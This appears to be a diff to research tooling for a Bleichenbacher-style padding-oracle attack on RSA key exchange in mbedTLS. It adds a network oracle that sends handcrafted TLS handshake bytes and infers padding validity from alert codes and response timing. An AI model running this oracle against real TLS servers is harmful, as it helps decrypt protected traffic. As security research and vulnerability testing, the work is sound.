@@ -7,123 +7,101 @@ import socket
 import struct
 import select
 import time
+import timeit
 
 
-class Oracle(object):
-    def __init__(self):
-        pass
-
-    def query(self, input):
-        raise NotImplementedError("Must override query")
-
-
-class PKCS1_v1_5_Oracle(Oracle):
-    """
-    Oracle for RSA PKCS #1 v1.5
-    """
-    def __init__(self, key):
-        self.cipher = PKCS1_v1_5.new(key)
-        super(Oracle, self).__init__()
-
-    def query(self, input):
-        """
-        Checks if input is a conforming encryption
-        :param input: bytearray of size k, where k=n_length/8
-        :return: True if input is a valid encryption, False else
-        """
-        if self.cipher.decrypt(input, None) is None:
-            return False
-        return True
-
-def build_keyexch(pms, identity=b"Client_identity"):
+def _build_keyexch(pms, identity=b"Client_identity"):
     paramslen = 4 + len(pms) + len(identity)
     fmt = ">BHHBBHH%usH%us" % (len(identity), len(pms))
     return struct.pack(fmt, 22, 0x303, paramslen + 4, 16, 0, paramslen, len(identity), identity, len(pms), pms)
 
-def sock_init(addr, port):
+def _sock_init(addr, port):
     sock = socket.socket()
     sock.connect((addr, port))
     sock.send(bytes.fromhex("16030300610100005d030362ac2c12d90b74d84a688188a36a11df1455920891da9ab4cfc2cfb8f0ba0a7d00000400b600ff010000300000000e000c0000096c6f63616c686f7374000d000e000c060306010503050104030401001600000017000000230000"))
     sock.setblocking(0)
-    read_server_hello(sock)
+    _read_server_hello(sock)
     return sock
 
-def read_bytes(sock, count, timeout=1):
+def _read_bytes(sock, count, timeout=1):
     res = select.select([sock], [], [], timeout)
     if not res[0]:
         return b""
     return sock.recv(count)
 
-def read_server_hello(sock):
+def _read_server_hello(sock):
     while True:
-        hdr = read_bytes(sock, 6)
+        hdr = _read_bytes(sock, 6)
         typ, ver, length, msgtype = struct.unpack(">BHHB", hdr)
-        read_bytes(sock, length - 1)  # read rest of frame
+        _read_bytes(sock, length - 1)  # read rest of frame
         if msgtype == 0xE:  # server hello done
             break
 
-def read_resp(sock):
-    typ = read_bytes(sock, 1)
+def _read_resp(sock):
+    typ = _read_bytes(sock, 1)
     if len(typ) == 0:
         return -1
     if typ != b"\x15":
         return -2
-    ver = read_bytes(sock, 2)
-    length = read_bytes(sock, 2)
+    ver = _read_bytes(sock, 2)
+    length = _read_bytes(sock, 2)
     if length != b"\x00\x02":
         return -3
-    lvl = read_bytes(sock, 1)
+    lvl = _read_bytes(sock, 1)
     if lvl != b"\x02":
         return -4
-    desc = read_bytes(sock, 1)
+    desc = _read_bytes(sock, 1)
     return int.from_bytes(desc, byteorder="big")
 
+def _init_sock(method):
+    def new_method(self, *args, **kwargs):
+        if self.sock is None:
+            self.sock = _sock_init(self.addr, self.port)
+        return method(self, *args, **kwargs)
+    return new_method
 
-class Oracle_MbedTLS(Oracle):
-    def __init__(self, addr="127.0.0.1", port=4433):
-        super(Oracle, self).__init__()
+
+class _MbedTLS_Oracle_Single:
+    ERROR_INVALID_PADDING=91
+
+    def __init__(self, addr, port, stage):
         self.sock = None
         self.addr = addr
         self.port = port
+        self.stage = stage
+        self.stage_queries = {1: self.query_by_error, 2: self.query_by_error,
+                              3: self.query_by_timing, 4: self.query_by_timing,
+                              5: self.query_by_average, 6: self.query_by_average}
 
-    def query(self, input):
-        if self.sock is None:
-            self.sock = sock_init(self.addr, self.port)
-        self.sock.send(build_keyexch(input))
-        resp = read_resp(self.sock)
-        # if resp != 91:
-        #     print("RESP %d" % resp)
-        return resp != 91
+    def query_by_error(self, content):
+        self.sock.send(_build_keyexch(content))
+        resp = _read_resp(self.sock)
+        return resp != self.ERROR_INVALID_PADDING
 
-    def query_async(self, input):
-        if self.sock is None:
-            self.sock = sock_init(self.addr, self.port)
-        self.sock.send(build_keyexch(input))
-        yield
-        resp = read_resp(self.sock)
-        # if resp != 91:
-        #     print("RESP %d" % resp)
-        yield resp != 91
+    def query_by_timing(self, content, iterations=3, threshold=0.05):
+        for _ in range(iterations):
+            start = time.time()
+            self.query_by_error(content)
+            end = time.time()
+            if end - start < threshold:
+                return False
+        return True
 
+    def query_by_average(self, content, iterations=3, threshold=0.025):
+        total = timeit.timeit(lambda : self.query_by_error(content), number=iterations)
+        time_avg = total / iterations
+        return time_avg > threshold
 
-class PKCS1_OAEP_Oracle(Oracle):
-    """
-    Oracle for RSA PKCS #1 OAEP
-    """
-    def __init__(self, k, key):
-        self.n = key.n
-        self.d = key.d
-        self.B = 2 ** (8 * (k - 1))
-        super(Oracle, self).__init__()
+    @_init_sock
+    def query(self, content, *args, **kwargs):
+        return self.stage_queries[self.stage](content, *args, **kwargs)
 
-    def query(self, input):
-        """
-        Checks if the decryption of input is less than B
-        :param input: bytearray of size k, where k=n_length/8
-        :return: True if (input) ** d mod n is less than B, False else
-        """
-        c = int.from_bytes(input, byteorder='big')
-        p = pow(c, self.d, self.n)
-        if p < self.B:
-            return True
-        return False
+class MbedTLS_Oracle:
+    def __init__(self, addr="127.0.0.1", port=4433, stage=1, num_servers=1):
+        self.oracles = [_MbedTLS_Oracle_Single(addr, port, stage) for _ in range(num_servers)]
+
+    def query(self, content, *args, **kwargs):
+        return self.oracles[0].query(content, *args, **kwargs)
+
+    def __len__(self):
+        return len(self.oracles)
